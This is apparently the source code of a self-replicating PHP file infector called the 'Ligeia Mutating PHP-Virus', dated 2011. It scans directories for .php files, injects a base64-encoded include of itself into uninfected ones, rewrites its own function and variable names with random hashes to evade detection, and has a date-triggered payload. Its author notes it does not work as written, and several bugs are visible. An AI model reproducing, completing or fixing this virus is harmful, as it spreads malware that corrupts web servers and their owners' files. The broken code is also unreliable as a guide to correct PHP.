<?php
 /* Ligeia Mutating PHP-Virus
 Version: 1.00 A
 Author: zerop
 Date: 2 June 2011
 ------------
 Bi0tic.info |
 ------------


 The Virus wont work, u have to fix it ;)

 Functions:
      -mutate
      -is_infected
      -payl
      -infect
      -check
      -getVics
 */

 ///////IsInfected?$funcarray = array();
 $vararray = array();
 $cryptvararray = array();
 $cryptfuncarray = array();


 function is_infected($parameter)
      {
          $rhine = fopen($parameter, "r");
          $infenctingfile_str = fread($rhine,filesize($parameter));
          $reborn = strstr ($infenctingfile_str, 'Ligeia');
          fclose($rhine);
           if ($reborn != false) return TRUE;
          return false;
      }



 function mutate($parameter)
      {
          $thisFileContent = file(basename(__FILE__));

               foreach ($thisFileContent as $zeile)
                  {
                       $spos=strpos($zeile, "function");
                        if (is_int($spos)&&($spos==0))
                            {
                              if (substr($zeile, 8, 
 (strpos($zeile,"{"))-8) != "")
                                  {
                              $funcarray[]=trim(substr($zeile, 8, 
 (strpos($zeile,"{"))-8));
                                       }
                           };
                    }

              foreach ($thisFileContent as $zeile)
                      {
                      $spos=strpos($zeile, "$");
                             if (is_int($spos)&&($spos==0))
                              {
                                  if (substr($zeile, spos+1, 
 (strpos($zeile," "))-spos) != "")
                                  {
                                            
   $vararray[]=trim(substr($zeile, spos+1, (strpos($zeile," "))-spos));
                                  }
                              };
                        }


              for ( $x = 0; $x < count ( $funcarray ); $x++ )
                  {
                          $cryptfuncarray[]="L".md5(uniqid(rand()));
                  }

              for ( $x = 0; $x < count ( $vararray ); $x++ )
                  {
                      $cryptvararray[]="L".md5(uniqid(rand()));
                  }

 $d = implode('', $thisFileContent);
 $d = str_replace($funcarray, $cryptfuncarray, $d);
 $d = str_replace($vararray, $cryptvararray, $d);
 $f = fopen(basename(__FILE__), "w");
 fwrite($f, $d);
 fclose($f);
      }



 function infect ($param1)
      {
          $basename = basename(__FILE__) ; // Get Filename
            $rhine = fopen($param1, "r+");
             $file_str = fread($rhine,filesize($param1)); // read file
          $in = base64_encode("include(". $basename .");");
          $whole_encrypt = "base64_decode('".$in."'); // Ligeia ?>";
          $whole_encrypt2 = "<?php base64_decode('".$in."'); // Ligeia";

          $ran = rand(0,1);
          switch ($ran) {
                         case 0: //verschlüsseltes ersetzen
                                 $file_str = 
 str_replace('?>',$whole_encrypt,$file_str);
                                   fwrite($rhine,$file_str);
                                    fclose ($rhine);
                            break;

                         case 1:
                              $file_str = 
 str_replace('<?php',$whole_encrypt2,$file_str);
                                 rewind($rhine);
                                   fwrite($rhine,$file_str);
                                    fclose ($rhine);
                          break;


                          case 2:
                                 /// just empty
                          break;
                  }



      }
 function check($para) // File ok?
      {
      return ( (is_file($para)) &&
              (is_writeable($para)) &&
              (filesize($para) > 27) );
      }


 function payl ()// payload
      { $day = date("d.m", time());
        if ($day == false ) return FALSE;

          if ($day == 7.10 || $day == 19.01) //?????
              {
                  $ligeiA = fopen(".LigeiA","w");
                  if ($ligeiA)
                  {
                  fwrite($ligeiA, "It was the radiance of an opium-dream; 
 an airy
                  and spirit-lifting vision more wildly divine than the 
 phantasies which
                  hovered about the slumbering souls of the daughters of 
 Delos") ;
                  fclose ($lig);
                  return true;
                  }
              }
           return false;
      }


 function getVics($dirLig)
 {
        $files = array();
        if ($handle = opendir($dirLig))
      {
              while (false != ($file = readdir($handle)))
          {
                     if ($file != "." && $file != ".." )
              {
                      if(is_dir($dirLig.'/'.$file))
                  {
                             $dirn = $dirLig.'/'.$file;
                      $files[] = getVics($dirn);
                     }
                      else
                  {
                      if (strstr ($file, '.php') != false)
                           $files[] = $dirLig.'/'.$file;
                     }
              }
             }
              closedir($handle);
      }
      return arrayadd($files);
 }

 function arrayadd($array)
 {
      $varray = array();
        foreach($array as $a)
      {
              if(is_array($a)) $varray = array_merge((array)$varray, 
 arrayadd($a));
           else $tmp[] = $a;
       }
        return $varray;
 }


 /* Ligeia*/


 if (!payl)
 {

 $varray = getVics(dirname(__FILE__));
 echo sizeof($varray);
 for ($i = 0 ; $i < sizeof($varray); $i++)
      {echo "test";
      if (check($varray[$i]))
          {

          if (is_infected($varray[$i])) {mutate($varray[$i]);} else { 
 infect($varray[$i]);}
          }
      }


 }